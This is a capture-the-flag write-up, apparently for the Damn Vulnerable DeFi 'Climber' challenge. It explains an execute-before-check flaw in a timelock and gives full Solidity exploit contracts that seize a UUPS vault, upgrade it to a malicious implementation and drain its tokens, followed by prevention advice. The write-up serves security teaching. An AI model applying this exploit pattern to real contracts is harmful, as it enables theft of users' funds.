# Climber

There's a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the [UUPS pattern](https://eips.ethereum.org/EIPS/eip-1822).

The owner of the vault is a timelock contract. It can withdraw a limited amount of tokens every 15 days.

On the vault there's an additional role with powers to sweep all tokens in case of an emergency.

On the timelock, only an account with a "Proposer" role can schedule actions that can be executed 1 hour later.

You must rescue all tokens from the vault and deposit them into the designated recovery account.

## Vulnerability

The vulnerability exists in the `ClimberTimelock` contract's `execute` function. The function executes operations BEFORE checking if they are ready for execution:

```solidity
function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) {
    // ... validation checks ...
    
    for (uint8 i = 0; i < targets.length; ++i) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);  // Executes first
    }

    if (getOperationState(id) != OperationState.ReadyForExecution) {  // Checks after execution
        revert NotReadyForExecution(id);
    }
    // ...
}
```

This means that any operation can be executed immediately without waiting for the timelock delay, as long as it's scheduled in the same transaction.

## Solution

The solution involves creating an attacker contract that:

1. Gets the PROPOSER_ROLE from the timelock
2. Sets the delay to 0
3. Transfers vault ownership to itself
4. Schedules the operation (which will execute immediately due to 0 delay)
5. Upgrades the vault to a malicious implementation
6. Drains the funds

The attack works because:
- The timelock executes operations before checking if they're ready
- The timelock has ADMIN_ROLE and can grant PROPOSER_ROLE
- The timelock is the owner of the vault and can transfer ownership
- The vault is upgradeable using the UUPS pattern

## Proof of Concept

Here's the detailed implementation of the attack:

1. First, we create a malicious vault implementation that will allow us to drain funds:
```solidity
contract MaliciousVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function drainFunds(address token, address receiver) external {
        SafeTransferLib.safeTransfer(token, receiver, IERC20(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}
```

2. Then, we create an attacker contract to orchestrate the attack:
```solidity
contract Attacker {
    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;
    address recovery;
    address[] targets = new address[](4);
    uint256[] values = new uint256[](4);
    bytes[] dataElements = new bytes[](4);

    constructor(
        ClimberVault _vault,
        ClimberTimelock _timelock,
        DamnValuableToken _token,
        address _recovery
    ) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        // Deploy malicious implementation
        address maliciousImpl = address(new MaliciousVault());

        // Prepare the attack operations
        bytes memory grantRoleData = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );

        bytes memory changeDelayData = abi.encodeWithSignature(
            "updateDelay(uint64)",
            uint64(0)
        );

        bytes memory transferOwnershipData = abi.encodeWithSignature(
            "transferOwnership(address)",
            address(this)
        );

        bytes memory scheduleData = abi.encodeWithSignature(
            "timelockSchedule()"
        );
    
        // Set up the targets and their data
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = grantRoleData;

        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = changeDelayData;

        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = transferOwnershipData;

        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = scheduleData;

        // Execute the attack
        timelock.execute(
            targets,
            values,
            dataElements,
            bytes32(0)
        );

        // Upgrade and drain
        vault.upgradeToAndCall(address(maliciousImpl), "");
        MaliciousVault(address(vault)).drainFunds(address(token), recovery);
    }

    function timelockSchedule() external {
        timelock.schedule(targets, values, dataElements, bytes32(0));
    }
}
```

3. The attack sequence:
   - Deploy the malicious vault implementation
   - Prepare the attack operations:
     1. Grant PROPOSER_ROLE to the attacker
     2. Set timelock delay to 0
     3. Transfer vault ownership to attacker
     4. Schedule the operation (which will execute immediately)
   - Execute the operations through the timelock
   - Upgrade the vault to the malicious implementation
   - Drain all funds to the recovery address

4. The attack succeeds because:
   - The timelock executes operations before checking if they're ready
   - The attacker gets PROPOSER_ROLE and can schedule operations
   - The delay is set to 0, allowing immediate execution
   - The attacker becomes the vault owner and can upgrade it
   - The malicious implementation allows draining funds without sweeper role

## Prevention

To prevent this vulnerability:
1. Check operation state BEFORE executing operations
2. Don't allow self-administration of the timelock
3. Add proper scheduling verification in the execute function
4. Consider using a more secure timelock implementation like OpenZeppelin's TimelockController

## Files
- `ClimberVault.sol`: The upgradeable vault contract
- `ClimberTimelock.sol`: The vulnerable timelock contract
- `ClimberTimelockBase.sol`: Base contract for the timelock
- `ClimberConstants.sol`: Constants used in the contracts
- `ClimberErrors.sol`: Custom errors used in the contracts
